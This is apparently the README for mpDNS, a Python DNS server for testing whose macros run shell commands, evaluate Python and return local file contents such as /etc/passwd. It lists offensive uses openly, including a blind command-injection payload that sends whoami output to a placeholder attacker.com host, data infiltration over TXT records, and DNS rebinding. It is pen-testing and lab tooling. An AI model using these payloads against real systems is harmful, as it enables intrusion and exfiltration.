mpDNS aka multi-purpose DNS Server
--------------------
Simple, configurable DNS Server with multiple useful features
- Python 3
- names.db -> holds all custom records (see examples)
- Simple wildcards like *.example.com
- Catch unicode dns requests
- Custom actions aka macro:
  - `{{shellexec::dig google.com +short}}` _-> Execute shell command and respond with result_
  - `{{eval::res = '1.1.1.%d' % random.randint(0,256)}}` _-> Evaluate your python code_
  - `{{file::/etc/passwd}}` _-> Respond with localfile contents_
  - `{{filelist::/somefile.list}}` _-> Respond with multiple results line by line_
  - `{{resolve}}` _-> Forward DNS request to local system DNS_
  - `{{resolve::example.com}}` _-> Resolve example.com instead of original record_
  - `{{echo}}` _-> Response back with peer address_
  - `{{shellexec::echo %PEER% %QUERY% %QUERYTYPE%}}` _-> Use of variables_
- See names.db.example for more

Heavily based on <https://github.com/circuits/circuits/blob/master/examples/dnsserver.py>

Quick Start
-----------
```
git clone https://github.com/nopernik/mpDNS
cd ./mpDNS
pip install -r requirements.txt
touch names.db
```
Now you're ready to fill your DNS records in **names.db** based on **names.db.example**

Usage: `./mpdns.py`
 - Create **names.db**. See names.db.example
 - Edit DNS records in **names.db** with `./mpdns.py -e` no restart required

Offensive and Defensive purposes:
-----------
1. You need a light-weight simple dns-server solution for testing purposes (NOT PRODUCTION!)
2. Test for various blind injection vulnerabilities in web applications _(ex. `/ping.php?ip=$(dig $(whoami).attacker.com)`)_
3. Easily infiltrate 65K of data in one `TXT` query
4. DNS Rebinding
5. Execute custom macro action on specific query (useful in malware-analysis lab environments)
6. And lots more. It is highly customizable.

Limitations
------------------
1. Due to UDP Datagram limit of 65535 bytes, DNS response is limited to approx ~65200 bytes\
this limitation applies to `TXT` records which are splitted into chunks of 256 bytes until response reaches maximum allowed 65200b\
therefore `TXT` record with macro `{{file:localfile.txt}}` is limited to 65200 bytes.
2. No support for nested wildcards **`test.*.example.com`**
3. No support for custom DNS server resolver in `{{resolve::example.com}}` macro
4. `TTL` always set to **0**

Examples
-----------
**names.db example:**
```
# Empty configuration will result in empty but valid responses
#
# Unicode domain names are not supported but still can be catched by the server.
# for example мама-сервер-unicode.google.com will be catched but with SERVFAIL response

passwd.example.com	TXT     {{file::/etc/passwd}}  #comments are ignored
shellexec			TXT     {{shellexec::whoami}}
eval				TXT     {{eval::import random; res = random.randint(1,500)}}
resolve1			A       {{resolve}}
resolve2			A       {{resolve::self}}      #same as previous
resolve3			A       {{resolve::example.com}}
blabla.com			A       5.5.5.5

*					A       127.0.0.1
*.example.com		A		7.7.7.7
c1.example.com		CNAME	c2.example.com
c2.example.com		CNAME	c3.example.com
c3.example.com		CNAME	google.example.com
google.example.com	CNAME	google.com
test.example.com	A		8.8.8.8
google.com			A		{{resolve::self}}
notgoogle.com		A		{{resolve::google.com}}
```

Example output with names.db example:
---------


**Regular resolution from DB**: `dig test.example.com @localhost`
```
;; ANSWER SECTION:
test.example.com.	0	IN	A	8.8.8.8
```
_mpDNS output:_ `- Request from 127.0.0.1:57698      -> test.example.com.	-> 8.8.8.8 (A)`

-----
**Recursive CNAME resolution**: `dig c1.example.com @localhost`

```
;; QUESTION SECTION:
;c1.example.com.			IN	A

;; ANSWER SECTION:
c1.example.com.		0	IN	CNAME	c2.example.com.
c2.example.com.		0	IN	CNAME	c3.example.com.
c3.example.com.		0	IN	CNAME	google.example.com.
google.example.com.	0	IN	CNAME	google.com.
google.com.		0	IN	A	216.58.206.14
```
_mpDNS output:_ 
```
- Request from 127.0.0.1:44120      -> c1.example.com.		-> c2.example.com (CNAME)
- Request from 127.0.0.1:44120      -> c2.example.com		-> c3.example.com (CNAME)
- Request from 127.0.0.1:44120      -> c3.example.com		-> google.example.com (CNAME)
- Request from 127.0.0.1:44120      -> google.example.com	-> google.com (CNAME)
- Request from 127.0.0.1:44120      -> google.com			-> {{resolve::self}} (A)
```

-----

**Wildcard resolution**: `dig not-in-db.com @localhost`

```
;; ANSWER SECTION:
not-in-db.com.		0	IN	A	127.0.0.1
```
_mpDNS output:_ `- Request from 127.0.0.1:38528      -> not-in-db.com.	-> 127.0.0.1 (A)`

-----
**Wildcard subdomain resolution**: `dig wildcard.example.com @localhost`

```
;; ANSWER SECTION:
wildcard.example.com.	0	IN	A	7.7.7.7
```
_mpDNS output:_ `- Request from 127.0.0.1:39691      -> wildcard.example.com.	-> 7.7.7.7 (A)`

-----
**Forward request macro**: `dig google.com @localhost`
```
;; ANSWER SECTION:
google.com.		0	IN	A	172.217.22.110
```
_mpDNS output:_ `- Request from 127.0.0.1:53487      -> google.com.	-> {{resolve::self}} (A)`

-----
**Forward request of custom domain macro**: `dig notgoogle.com @localhost`
```
;; ANSWER SECTION:
notgoogle.com.		0	IN	A	172.217.22.110
```
_mpDNS output:_ `- Request from 127.0.0.1:47797      -> notgoogle.com.	-> {{resolve::google.com}} (A)`

-----
**File contents macro via TXT query**: `dig txt passwd.example.com @localhost`
```
;; ANSWER SECTION:
passwd.example.com.	0	IN	TXT	"root:x:0:0:root:/root:/bin/bash\010daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\010bin:x:2:2:bin:......stripped"
```
_mpDNS output:_ `- Request from 127.0.0.1:38805      -> passwd.example.com.	-> ['root:x:0:0:root...(2808)'] (TXT)`

-----
**Custom python code macro via TXT query**: `dig txt eval @localhost`
```
;; ANSWER SECTION:
eval.			0	IN	TXT	"320"
```
_mpDNS output:_ `- Request from 127.0.0.1:33821      -> eval.	-> ['320'] (TXT)`

-----
**Shell command macro via TXT query**: `dig txt shellexec @localhost`
```
;; ANSWER SECTION:
shellexec.		0	IN	TXT	"root"
```
_mpDNS output:_ `- Request from 127.0.0.1:50262      -> shellexec.	-> ['root'] (TXT)`

-----

Have fun!
